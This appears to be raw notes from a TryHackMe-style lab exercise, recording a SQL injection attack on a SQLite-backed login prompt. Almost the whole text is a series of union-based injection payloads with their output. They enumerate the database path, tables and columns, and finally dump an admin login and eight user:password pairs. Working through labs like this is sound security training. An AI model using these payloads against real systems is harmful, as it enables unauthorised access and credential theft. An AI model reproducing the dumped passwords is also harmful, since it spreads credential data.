username : smokey
password : vYQ5ngPpw8AdUmL

tF8tj2o94WE4LKC

Please enter your username: ' UnIoN SeLeCt null, table_name, null FrOm information_schema.tables WhErE '1'='1                                                               
Error: no such table: information_schema.tables


' UnIoN SeLeCt null,file,null FROM PRAGMA_database_list WhErE '1'='1

' UnIoN SeLeCt null WhErE '1'='1

' UnIoN SeLeCt file FROM PRAGMA_database_list WhErE '1'='1

Please enter your username: ' UnIoN SeLeCt file FROM PRAGMA_database_list WhErE '1'='1
Password: /home/adrian/users.db


' UnIoN SeLeCt name FROM sqlite_master WHERE type='table' WhErE '1'='1


Please enter your username: ' UnIoN SeLeCt name FROM sqlite_master WHERE type='table' AND '1'='1
Password: admintable


Please enter your username: ' UnIoN SeLeCt group_concat(name) FROM PRAGMA_table_info('admintable') WHERE '1'='1
Password: id,username,password


Please enter your username: ' UnIoN SeLeCt username || ':' || password FROM admintable WHERE '1'='1
Password: TryHackMeAdmin:mamZtAuMlrsEy5bp6q17

Please enter your username: ' UnIoN SeLeCt group_concat(name) FROM sqlite_master WHERE type='table' AND '1'='1
Password: usertable,admintable

' UnIoN SeLeCt group_concat(name) FROM PRAGMA_table_info('usertable') WHERE '1'='1

' UnIoN SeLeCt username || ':' || password FROM usertable WHERE '1'='1

Please enter your username: ' UnIoN SeLeCt username || ':' || password FROM usertable WHERE '1'='1
Password: alice:tF8tj2o94WE4LKC

Please enter your username: ' UnIoN SeLeCt group_concat(username || ':' || password) FROM usertable WHERE '1'='1
Password: alice:tF8tj2o94WE4LKC,rob:yAn4fPaF2qpCKpR,john:e74tqwRh2oApPo6,michael:7DV4dwA0g5FacRe,smokey:vYQ5ngPpw8AdUmL,hazel:EcSuU35WlVipjXG,ralph:YO1U9O1m52aJImA,steve:WObjufHX1foR8d7


' UnIoN SeLeCt group_concat(username || ':' || password) FROM admintable WHERE '1'='1